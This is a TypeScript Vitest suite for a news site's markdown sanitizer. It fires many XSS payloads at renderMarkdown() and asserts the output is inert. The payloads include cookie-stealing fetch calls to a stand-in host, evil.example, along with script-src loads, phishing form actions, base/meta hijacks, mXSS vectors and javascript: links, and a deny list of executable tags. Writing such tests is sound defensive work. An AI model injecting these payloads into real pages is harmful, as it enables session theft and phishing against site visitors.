/**
 * XSS prevention attack suite.
 *
 * Every article body (public /news/[id] page and the admin preview) is rendered
 * through renderMarkdown() and injected with dangerouslySetInnerHTML. This suite
 * fires known attack payloads through that choke point and asserts the output is
 * inert. If a refactor ever swaps or weakens the sanitizer, these tests fail in CI
 * before the change ships.
 */
import { describe, it, expect } from 'vitest';
import { renderMarkdown } from '@/lib/markdown';

/** Assert rendered HTML contains no executable vector. */
function expectInert(html: string) {
  const lower = html.toLowerCase();
  expect(lower).not.toContain('<script');
  expect(lower).not.toContain('</script');
  expect(lower).not.toContain('<iframe');
  expect(lower).not.toContain('<object');
  expect(lower).not.toContain('<embed');
  expect(lower).not.toContain('<form');
  expect(lower).not.toContain('<base');
  expect(lower).not.toContain('<meta');
  expect(lower).not.toContain('<link');
  expect(lower).not.toContain('javascript:');
  expect(lower).not.toContain('vbscript:');
  // No inline event handlers of any kind (onerror=, onload=, onclick=, …)
  expect(lower).not.toMatch(/\son[a-z]+\s*=/);
  // No style-based execution or exfiltration surface
  expect(lower).not.toMatch(/<style/);
  expect(lower).not.toMatch(/style\s*=/);
}

describe('renderMarkdown strips script injection', () => {
  const payloads: [name: string, payload: string][] = [
    ['plain script tag', '<script>alert(document.cookie)</script>'],
    ['script with src', '<script src="https://evil.example/x.js"></script>'],
    ['uppercase script', '<SCRIPT>alert(1)</SCRIPT>'],
    ['nested/split script', '<scr<script>ipt>alert(1)</scr</script>ipt>'],
    ['script inside markdown emphasis', '*hello* <script>alert(1)</script> _world_'],
    ['script inside code-looking text', 'Rates rose. <script>fetch("https://evil.example?c="+document.cookie)</script>'],
    ['img onerror', '<img src=x onerror=alert(document.domain)>'],
    ['img onerror, quoted', '<img src="x" onerror="alert(1)">'],
    ['svg onload', '<svg onload=alert(1)>'],
    ['svg with embedded script', '<svg><script>alert(1)</script></svg>'],
    ['body onload', '<body onload=alert(1)>'],
    ['details ontoggle', '<details open ontoggle=alert(1)><summary>x</summary></details>'],
    ['anchor javascript: href (html)', '<a href="javascript:alert(1)">click</a>'],
    ['anchor javascript: href (markdown)', '[click me](javascript:alert(1))'],
    ['anchor javascript: mixed case', '[click](JaVaScRiPt:alert(1))'],
    ['anchor javascript: with whitespace/newline', '[click](java\nscript:alert(1))'],
    ['anchor javascript: html-encoded colon', '<a href="javascript&#58;alert(1)">x</a>'],
    ['img javascript: src (markdown)', '![x](javascript:alert(1))'],
    ['data: text/html iframe', '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>'],
    ['data: URI link', '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'],
    ['object with data', '<object data="https://evil.example/x.swf"></object>'],
    ['embed', '<embed src="https://evil.example/x.svg">'],
    ['form action hijack', '<form action="https://evil.example/phish"><input name=password></form>'],
    ['base href hijack', '<base href="https://evil.example/">'],
    ['meta refresh redirect', '<meta http-equiv="refresh" content="0;url=https://evil.example">'],
    ['link stylesheet exfil', '<link rel="stylesheet" href="https://evil.example/x.css">'],
    ['style tag', '<style>body{background:url("https://evil.example/exfil")}</style>'],
    ['inline style attribute', '<div style="background:url(https://evil.example)">x</div>'],
    ['script-in-attribute breakout', '<img src="x" alt="\"><script>alert(1)</script>">'],
    ['mXSS math/annotation-xml', '<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>'],
    ['mutation via noscript', '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'],
    ['closing script inside markdown code fence text', '</script><script>alert(1)</script>'],
    ['event handler on allowed tag', '<mark onmouseover="alert(1)">highlighted</mark>'],
    ['sup with handler', '<sup onclick="alert(1)">2</sup>'],
    ['figure with onerror img', '<figure><img src=x onerror=alert(1)><figcaption>x</figcaption></figure>'],
  ];

  it.each(payloads)('%s', (_name, payload) => {
    expectInert(renderMarkdown(payload));
  });

  it('neutralizes payloads embedded in an otherwise normal article', () => {
    const article = [
      '## Exchange rate update',
      '',
      'The Liberian dollar traded at 189.45 LRD per USD in March 2026.',
      '',
      '<img src=x onerror="fetch(`https://evil.example?c=${document.cookie}`)">',
      '',
      'For market traders in Red Light, this means <script>steal()</script> stable prices.',
      '',
      '[See the CBL data](javascript:alert(1)) for details.',
    ].join('\n');
    expectInert(renderMarkdown(article));
  });
});

describe('renderMarkdown keeps legitimate article content working', () => {
  it('renders normal markdown structure', () => {
    const html = renderMarkdown('## Heading\n\nA paragraph with **bold** and a [link](https://truerate.example/news/foo).');
    expect(html).toContain('<h2>');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('href="https://truerate.example/news/foo"');
  });

  it('allows https images with alt text', () => {
    const html = renderMarkdown('<img src="https://xryhgfpudlpcxgpsytcc.supabase.co/storage/v1/object/public/hero.webp" alt="CBL headquarters in Monrovia">');
    expect(html).toContain('<img');
    expect(html).toContain('alt="CBL headquarters in Monrovia"');
  });

  it('allows relative internal links', () => {
    const html = renderMarkdown('[Related coverage](/news/lending-rate-holds)');
    expect(html).toContain('href="/news/lending-rate-holds"');
  });

  it('allows mailto links', () => {
    const html = renderMarkdown('[Contact](mailto:newsroom@truerate.example)');
    expect(html).toContain('href="mailto:newsroom@truerate.example"');
  });
});

describe('JSON-LD injection escaping contract', () => {
  // JsonLd.tsx injects JSON.stringify(...).replace(/</g, '\\u003c') into a
  // <script type="application/ld+json"> block. This pins the escaping contract:
  // a title containing "</script>" must not be able to close the block.
  it('escapes < so </script> cannot break out of the JSON-LD block', () => {
    const title = 'Rates fall</script><script>alert(1)</script>';
    const out = JSON.stringify({ headline: title }).replace(/</g, '\\u003c');
    expect(out).not.toContain('</script>');
    expect(out).toContain('\\u003c');
    // Still valid JSON that round-trips to the original title
    expect(JSON.parse(out).headline).toBe(title);
  });
});
